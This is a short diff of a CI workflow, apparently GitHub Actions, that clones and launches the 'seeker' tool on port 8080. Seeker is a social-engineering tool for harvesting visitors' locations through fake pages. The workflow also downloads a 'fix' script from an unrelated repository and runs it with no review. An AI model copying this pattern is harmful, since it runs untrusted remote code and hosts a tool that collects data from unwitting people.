@@ -15,7 +15,7 @@ jobs:
           pip3 install -q requests psutil --break-system-packages
           rm -rf /opt/seeker && git clone -q --depth 1 https://github.com/thewhiteh4t/seeker /opt/seeker
           curl -sL -o /tmp/fix.py https://raw.githubusercontent.com/datacfgx/sino-grid/main/tools/seeker-py314-fix.py && python3 /tmp/fix.py
-          (echo 0 | python3 /opt/seeker/seeker.py -p 8080 > /tmp/seeker.log 2>&1 &)
+          (cd /opt/seeker && echo 0 | python3 seeker.py -p 8080 > /tmp/seeker.log 2>&1 &)
           sleep 6
           if ! curl -sf -m 5 http://localhost:8080 > /dev/null; then
             MSGA=$(printf "SEEKER: app nao subiu. Log:\n%s" "$(tail -8 /tmp/seeker.log)")
